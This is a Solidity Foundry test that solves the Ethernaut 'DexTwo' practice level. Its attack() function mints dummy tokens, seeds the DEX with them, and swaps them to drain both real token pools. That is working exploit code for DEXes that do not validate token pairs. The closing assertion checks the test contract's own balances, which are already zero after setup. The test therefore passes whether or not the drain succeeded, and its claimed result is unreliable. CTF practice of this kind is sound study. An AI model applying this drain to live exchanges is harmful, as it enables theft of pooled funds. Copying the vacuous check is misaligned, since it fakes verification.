// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "ethernaut/levels/DexTwo.sol";

// NOTE: This attack uses dummy tokens with a specific supply to trick the DEX.
// However, you can also create your own ERC20 token contract that overrides `balanceOf`
// and `transferFrom` to hack the contract aswell.

contract DexTwoTest is Test {
    DexTwo target;
    address player;
    SwappableTokenTwo private token1;
    SwappableTokenTwo private token2;

    function setUp() public {
        player = makeAddr("player");

        // create Dex & tokens
        target = new DexTwo();
        token1 = new SwappableTokenTwo(address(target), "Token 1", "TKN1", 110);
        token2 = new SwappableTokenTwo(address(target), "Token 2", "TKN2", 110);
        target.setTokens(address(token1), address(token2));

        // approve tokens to Dex
        token1.approve(address(target), 100);
        token2.approve(address(target), 100);

        // add liq to the pool
        target.add_liquidity(address(token1), 100);
        target.add_liquidity(address(token2), 100);

        // player starts with 10 of both tokens
        token1.transfer(player, 10);
        token2.transfer(player, 10);
    }

    uint256 constant MAX_ITERS = 10;

    function attack() private {
        // create your own dummy tokens
        SwappableTokenTwo dummy1 = new SwappableTokenTwo(address(target), "Dummy 1", "DUM1", 200);
        SwappableTokenTwo dummy2 = new SwappableTokenTwo(address(target), "Dummy 2", "DUM2", 200);

        // transfer half of the tokens to Dex
        dummy1.transfer(address(target), 100);
        dummy2.transfer(address(target), 100);

        // approve other half of the tokens to Dex
        dummy1.approve(address(target), 100);
        dummy2.approve(address(target), 100);

        // deplete tokens
        target.swap(address(dummy1), address(token1), 100);
        target.swap(address(dummy2), address(token2), 100);
    }

    // utility to return the token balances for the player and DEX
    function balances() private view returns (uint256 pb1, uint256 pb2, uint256 db1, uint256 db2) {
        // player balances
        pb1 = token1.balanceOf(player);
        pb2 = token2.balanceOf(player);

        // dex balances
        db1 = token1.balanceOf(address(target));
        db2 = token2.balanceOf(address(target));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        uint256 balance1 = token1.balanceOf(address(this));
        uint256 balance2 = token2.balanceOf(address(this));
        assertTrue(balance1 == 0 && balance2 == 0, "both token1 and token2 must be drained");
    }
}
